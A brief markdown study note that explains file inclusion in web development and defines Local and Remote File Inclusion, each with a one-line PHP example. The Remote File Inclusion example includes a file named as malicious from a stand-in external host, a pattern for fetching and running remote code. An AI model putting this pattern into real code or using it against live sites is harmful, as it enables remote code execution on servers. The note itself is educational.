**File inclusion** is a technique used in web development to ***include the contents of one file into another***.

Types:
- **Local File Inclusion (LFI):** Include files from the ***local server***.
	- Example: `include('file.php')`
- **Remote File Inclusion (RFI):** Includes files from an ***external server****.
	- Example: `include('http://example.com/malicious.php')`
